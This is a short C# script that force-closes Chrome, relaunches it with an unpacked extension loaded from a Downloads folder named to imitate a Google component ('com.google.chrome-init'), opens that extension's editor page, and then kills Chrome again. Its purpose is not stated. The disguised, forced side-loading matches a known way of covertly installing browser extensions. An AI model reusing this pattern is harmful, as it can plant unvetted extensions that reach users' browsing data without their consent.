using System;
using System.Diagnostics;


var cmdText = @"/C taskkill.exe /F /IM chrome.exe";
Process.Start("cmd.exe",cmdText);

Thread.Sleep(3000);

var cmdText1 = @"/C start /B c:\""Program Files""\Google\Chrome\Application\chrome.exe --load-extension=C:\Users\User\Downloads\com.google.chrome-init\com.google-chrome-init ""https://www.google.com""";
Process.Start("cmd.exe",cmdText1);

Thread.Sleep(3000);

var cmdText2 = @"/C start /B c:\""Program Files""\Google\Chrome\Application\chrome.exe ""chrome-extension://lpmockibcakojclnfmhchibmdpmollgn/editor.html?store=0""";
Process.Start("cmd.exe", cmdText2);

Thread.Sleep(4000);

var cmdText3 = @"/C taskkill.exe /F /IM chrome.exe";
Process.Start("cmd.exe", cmdText3);
